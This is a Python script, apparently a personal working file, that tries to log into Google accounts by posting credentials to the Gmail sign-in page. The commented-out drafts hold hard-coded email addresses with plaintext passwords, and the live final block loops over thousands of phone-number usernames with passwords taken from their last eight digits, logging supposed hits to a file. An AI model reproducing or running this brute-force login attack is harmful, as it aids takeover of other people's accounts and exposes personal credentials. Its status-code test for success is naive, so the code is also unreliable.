# # # import requests

# # # session = requests.Session()

# # # # Obtain the Gmail login page to retrieve the necessary parameters (e.g. the csrf token)
# # # login_page = session.get('https://accounts.google.com/signin/v2/identifier')

# # # # Extract the csrf token from the login page using a regular expression
# # # import re
# # # csrf_token_match = re.search(r'name="csrf_token".*?value="(.*?)"', login_page.text)
# # # if csrf_token_match:
# # #     csrf_token = csrf_token_match.group(1)
# # # else:
# # #     raise Exception("CSRF token not found in login page")

# # # # Prepare the login data to be posted
# # # data = {
# # #     'identifier': 'fazlumiah2525@gmail.com',
# # #     'password': 'imranhasan123',
# # #     'csrf_token': csrf_token
# # # }

# # # # Perform the login request
# # # login_response = session.post('https://accounts.google.com/signin/v2/identifier', data=data, allow_redirects=True)

# # # # Check the login status
# # # if login_response.status_code == 200:
# # #     print("Login successful")
# # # else:
# # #     print("Login failed")



# # import requests
# # from bs4 import BeautifulSoup

# # session = requests.Session()

# # # Obtain the Gmail login page
# # login_page = requests.get('https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fmail.google.com%2F&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin')

# # soup = BeautifulSoup(login_page.text, 'html.parser')
# # csrf_token_input = soup.find_all('input', attrs={'name': 'csrf_token'})[0]['value']
# # print(csrf_token_input)
# # if csrf_token_input:
# #     csrf_token = csrf_token_input['value']
# # else:
# #     raise Exception("CSRF token not found in login page")

# # # Prepare the login data to be posted
# # data = {
# #     'identifier': 'fazlumiah2525@gmail.com',
# #     'password': 'imranhasan123',
# #     'csrf_token': csrf_token
# # }

# # # Perform the login request
# # login_response = session.post('https://accounts.google.com/signin/v2/identifier', data=data, allow_redirects=True)

# # # Check the login status
# # if login_response.status_code == 200:
# #     print("Login successful")
# # else:
# #     print("Login failed")



# import requests

# url = "https://accounts.google.com/signin/v2/identifier"

# payload = {
#     "Email": "aniks422@gmail.com",
#     "Passwd": "hiraraselranu",
# }

# headers = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
#     "Accept-Encoding": "gzip, deflate, br",
#     "Content-Type": "application/x-www-form-urlencoded",
# }

# session = requests.Session()
# response = session.post(url, data=payload, headers=headers)
# # with open('login.html', 'w') as f:
# #     for i in response.text.split('script'):
# #         f.write(i+'\n')
# # print(response.text)


# if response.status_code == 200:
#     print("Login successful")
# else:
#     print("Login failed")



import requests
from bs4 import BeautifulSoup

url = "https://accounts.google.com/v3/signin/identifier?dsh=S-1912033757%3A1675145075301618&continue=http%3A%2F%2Fwww.google.com&hl=tr&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AWnogHdRFIauHYjYjn2mIDzhoR5GQMkje7140Iq5Kxc_QiE-nB4O_THoy-dnR03wNb3asY_ntvtWHQ"

number = int(input("Enter your number: "))
for i  in range(10000):
    number = number + i
    payload = {
    "Email": '0'+str(number),
        "Passwd": str(number)[-8:],
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    session = requests.Session()
    response = session.post(url, data=payload, headers=headers)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        with open('number.txt', 'a') as f:
            f.write(f"{'0'+str(number)} : {str(number)[-8:]} \n" )
        print("Login successful")
    else:
        print("Login failed")


